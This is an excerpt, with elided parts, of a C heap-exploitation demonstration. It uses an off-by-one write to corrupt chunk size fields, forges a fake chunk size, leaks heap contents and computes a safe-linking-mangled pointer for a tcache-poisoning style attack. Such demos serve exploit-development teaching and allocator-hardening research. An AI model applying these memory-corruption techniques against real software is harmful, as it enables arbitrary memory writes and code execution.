...
int main()
{
	...
	//heap leek
	int init_size = 0x78;
	uint8_t* leek_a = (uint8_t*) malloc(init_size);
	uint8_t* leek_b = (uint8_t*) malloc(0x10);
	uint8_t* leek_reader = (uint8_t*) malloc(init_size);
	uint8_t attack_block_size = 0x70 + 17;
	leek_a[init_size] = attack_block_size;
	free(leek_b);
	uint8_t* chunk = (uint8_t*) malloc(0x70);
	...
	for (int i = 0; i < 4 * 8; i++)
	{
		unsigned char targ = ((unsigned char*)(a))[i];
		printf(" %u", targ);
	}
	printf("\n");
	...
	*(size_t*) &b[real_b_size-sizeof(size_t)] = fake_size;
	...
	printf("B: %#lx, %#lx, %#lx, %#lx\n", *(size_t*)(b-8), *(size_t*)(b), *(size_t*)(b+8), *(size_t*)(b+16));
	free(b);
	...
	printf("B2: %#lx, %#lx, %#lx, %#lx\n", *(size_t*)(b-8), *(size_t*)(b), *(size_t*)(b+8), *(size_t*)(b+16));
	

	size_t pdiff = (size_t)(&d[0x30 / 8]) - (size_t)d;
	printf("Attack word = %p, d_offset = %p - %p = %i\n", (long)target ^ ((long)&d[0x30/8] >> 12), &d[0x30 / 8], d, pdiff);
